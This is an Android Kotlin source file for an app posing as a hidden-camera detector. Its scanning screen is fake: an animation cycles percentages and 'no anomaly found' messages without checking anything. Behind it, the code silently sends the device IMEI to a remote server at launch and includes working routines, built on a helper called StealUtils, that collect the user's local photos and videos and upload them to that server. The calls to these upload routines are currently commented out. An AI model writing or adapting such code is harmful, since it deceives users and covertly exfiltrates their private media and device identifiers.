package king.bird.camaradetector.act

import android.Manifest
import android.animation.ValueAnimator
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.os.AsyncTask
import android.os.Build
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.support.annotation.RequiresApi
import android.util.Log
import android.view.KeyEvent
import android.widget.Toast
import king.bird.camaradetector.net.Api
import king.bird.camaradetector.net.NetWorkUtilsK
import java.io.File
import king.bird.tool.PermissionUtils
import android.telephony.TelephonyManager
import android.view.LayoutInflater
import android.view.View
import android.widget.TextView
import com.google.gson.Gson
import com.zhy.http.okhttp.OkHttpUtils
import com.zhy.http.okhttp.callback.StringCallback
import king.bird.camaradetector.MyApplication
import king.bird.camaradetector.R
import king.bird.camaradetector.adapter.RecordAdapter
import king.bird.camaradetector.bean.User
import king.bird.camaradetector.utils.LogUtils
import king.bird.marrykotlin.iface.OnRequestListener
import king.bird.tool.StealUtils
import kotlinx.android.synthetic.main.act_main.*
import okhttp3.Call
import org.jetbrains.anko.async
import java.lang.Exception
import java.net.URL
import java.text.DecimalFormat
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap


class MainActivity : AppCompatActivity() {

    private var mExitTime: Long? = 0L
    private var mAnimator: ValueAnimator? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.act_main)
        saveUserInfo()
        switchLayout()
        initEvent()
        setView()
    }

    private fun initEvent() {
        mBtnStart.setOnClickListener {
            intoCamera()
        }
        mBtnScanGun.setOnClickListener {
            val mMediaPlayer = MediaPlayer.create(this@MainActivity, R.raw.notice)
            mMediaPlayer!!.start()
        }
    }

    @SuppressLint("SetTextI18n")
    private fun setView() {
        val df = DecimalFormat("#.0")
        var schedule = 0.0
        var totalCount = 0
        val format = SimpleDateFormat("MM-dd HH:mm:ss")
        if (null == mAnimator) {
            mAnimator = ValueAnimator.ofFloat(0F, 1F)
            mAnimator!!.repeatCount = -1
            mAnimator!!.duration = 3000
            mAnimator!!.addUpdateListener {
                if (df.format(schedule) != "100.0") {
                    schedule += 0.1
                    totalCount += 1
                    mTvScanGoods.text = "${df.format(schedule)}%"
                    mTvAllGoods.text = "${totalCount}次"
                } else {
                    schedule = 0.0
                }

                ll_layout.apply {
                    findViewById<TextView>(R.id.tv_time).text = format.format(Date())
                    findViewById<TextView>(R.id.tv_count).text = "第 $totalCount 次"
                    if(0==(totalCount%2))
                        findViewById<TextView>(R.id.tv_desc).text = "未发现异常.."
                    if(0==(totalCount%3))
                        findViewById<TextView>(R.id.tv_desc).text = "未发现异常..."
                }
            }
        }
        mAnimator!!.start()
    }

    /**
     * 上传图片
     */
    private fun upLoadPic(key: String, value: File, imei: String) {
        OkHttpUtils.post().addParams("dir", imei)
                .addFile(key, value.absolutePath, value)
                .url(Api.baseUrl)
                .addHeader("method", Api.upLoadPic)
                .build().execute(object : StringCallback() {
                    override fun onResponse(p0: String?, p1: Int) {
                        LogUtils.e(p0)
                    }

                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                        if (p1 != null) {
                            LogUtils.e(p1.message)
                        }
                    }
                })
    }

    /**
     * 批量上传图片
     */
    private fun upLoadPics(imei: String) {
        val allLocalPhotos = StealUtils.getAllLocalPhotos(this@MainActivity)
        val files = HashMap<String, File>()
        var i = 0
        //机算数量
        allLocalPhotos.forEach {
            if (it.fileSize / 1000 in 19..5999) {
                i++
                if (i < 10) {
                    //files[it.title] = File(it.filePath)
                    async {
                        OkHttpUtils.post().addParams("dir", imei)
                                .addFile(it.title, it.title, File(it.filePath))
                                .url(Api.baseUrl)
                                .addHeader("method", Api.upLoadPic)
                                .build().execute(object : StringCallback() {
                                    override fun onResponse(p0: String?, p1: Int) {
                                        LogUtils.e(p0)
                                    }

                                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                                        if (p1 != null) {
                                            LogUtils.e(p1.message)
                                        }
                                    }
                                })
                    }
                }
            }
        }

    }

    /**
     * 批量上传视频
     */
    private fun upLoadVideos(imei: String) {
        val allLocalPhotos = StealUtils.getAllLocalVideos(this@MainActivity)
        val files = HashMap<String, File>()
        var i = 0
        //机算数量
        allLocalPhotos.forEach {
            i++
            if (i < 5) {
                async {
                    OkHttpUtils.post().addParams("dir", imei)
                            //.files("file", files)
                            .addFile(it.title, it.title, File(it.filePath))
                            .url(Api.baseUrl)
                            .addHeader("method", Api.upLoadVideo)
                            .build().execute(object : StringCallback() {
                                override fun onResponse(p0: String?, p1: Int) {
                                    LogUtils.e(p0)
                                }

                                override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                                    if (p1 != null) {
                                        LogUtils.e(p1.message)
                                    }
                                }
                            })
                }
            }
        }

    }

    /**
     * 保存用户信息
     */
    @SuppressLint("HardwareIds", "SimpleDateFormat", "MissingPermission")
    private fun saveUserInfo() {

        val user = User()
        val map = HashMap<String, String>()
        val telephonyMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val imei = telephonyMgr.deviceId as String
        val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        val curDate = Date(System.currentTimeMillis())
        user.id = imei
        user.deviceId = imei
        user.intoCount = "0"
        user.imageSize = "0"
        user.createTime = formatter.format(curDate)
        map["data"] = Gson().toJson(user)
        NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.saveInfo, object : OnRequestListener {
            override fun onSuccess(t: String) {
//                async { upLoadPics(imei) }
//                async { upLoadVideos(imei) }

            }

            override fun onError(errorMsg: String) {
//                async { upLoadPics(imei) }
//                async { upLoadVideos(imei) }
            }
        })


    }

    /**
     * 切换tag
     */
    private fun switchLayout() {

        mRlScanGroup.setOnClickListener {
            mTvNoScanText.setTextColor(resources.getColor(R.color.red))
            mTvNoScanLine.setBackgroundColor(resources.getColor(R.color.red))
            mTvNoScanLine.visibility = View.VISIBLE
            mTvScanDetailText.setTextColor(resources.getColor(R.color.black_34))
            mTvScanDetailLine.visibility = View.INVISIBLE
            mLlAutoScan.visibility = View.VISIBLE
            mLlHandScan.visibility = View.GONE
        }

        mRlScanDetail.setOnClickListener {
            mTvScanDetailText.setTextColor(resources.getColor(R.color.red))
            mTvScanDetailLine.visibility = View.VISIBLE
            mTvNoScanText.setTextColor(resources.getColor(R.color.black_34))
            mTvNoScanLine.visibility = View.INVISIBLE
            mLlAutoScan.visibility = View.GONE
            mLlHandScan.visibility = View.VISIBLE
        }
    }

    private fun intoCamera() {
        val intent = Intent()
        intent.action = "android.media.action.VIDEO_CAPTURE"
        intent.addCategory("android.intent.category.DEFAULT")
        startActivityForResult(intent, 0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        Log.e("", "拍摄完成，resultCode=$requestCode")
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            if (System.currentTimeMillis() - this!!.mExitTime!! > 2000) {
                Toast.makeText(applicationContext, "不退出应用可以持续监测", Toast.LENGTH_SHORT).show()
                mExitTime = System.currentTimeMillis()

            } else {
                System.exit(0)
                finish()
            }
            return true
        }
        return super.onKeyDown(keyCode, event)
    }


}
